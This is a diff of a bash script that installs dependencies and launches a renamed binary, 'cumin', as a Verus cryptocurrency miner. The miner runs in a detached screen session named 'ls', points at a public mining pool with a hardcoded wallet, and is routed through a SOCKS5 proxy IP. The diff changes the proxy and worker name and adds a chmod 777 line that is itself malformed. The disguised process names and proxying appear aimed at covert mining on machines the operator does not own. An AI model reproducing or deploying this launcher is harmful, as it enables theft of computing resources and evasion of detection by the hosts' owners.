@@ -1,10 +1,10 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x cumin
+chmod +x kokoh.sh && chmod +x cumin chmod 777 cumin kokoh.sh
 screen -dmS ls 
 POOL=stratum+tcp://eu.luckpool.net:3956
 WALLET=RKq1mFG57gmApqmGxLtXEv2Mm7y3fTZuCX
-WORKER=$(echo $(shuf -i 1-100 -n 1)-Embe)
-PROXY=socks5://213.96.240.156:4145
-./cumin -a verus -o $POOL -u $WALLET.pion -t 2 -x $PROXY
+WORKER=$(echo $(shuf -i 1-10 -n 1)PION)
+PROXY=socks5://98.162.96.41:4145
+./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
